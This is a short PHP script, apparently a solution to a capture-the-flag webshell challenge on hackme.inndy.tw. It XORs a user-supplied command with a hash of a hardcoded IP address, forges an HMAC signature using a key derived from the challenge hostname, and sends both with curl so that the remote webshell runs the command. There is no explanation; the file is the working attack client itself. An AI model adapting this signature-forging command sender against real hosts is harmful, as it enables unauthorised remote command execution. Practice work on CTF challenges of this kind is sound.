<?php 

function strToHex($string){
  $hex = '';
  for ($i=0; $i<strlen($string); $i++){
    $ord = ord($string[$i]);
    $hexCode = dechex($ord);
    $hex .= '%'.substr('0'.$hexCode, -2);
  }
  return strToUpper($hex);
}

function run() {
  $ip = "211.72.129.89";
  
  if(isset($_GET['cmd'])) { 
    $cmd = hash('SHA512', $ip) ^ (string)$_GET['cmd']; 
    print "cmd : " . strToHex($cmd) . "\n";
    $key = "" . sha1("webshell.hackme.inndy.tw"); 
    $sig = hash_hmac('SHA512', (string)$_GET['cmd'], $key); 
    print "sig : " . $sig . "\n\n";

    $url = 'https://webshell.hackme.inndy.tw/?cmd=' . $cmd . '&sig=' . $sig;
  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_USERAGENT, "");
    curl_exec($ch);
    curl_close($ch);
  }
  return false; 
} 

run();

?>
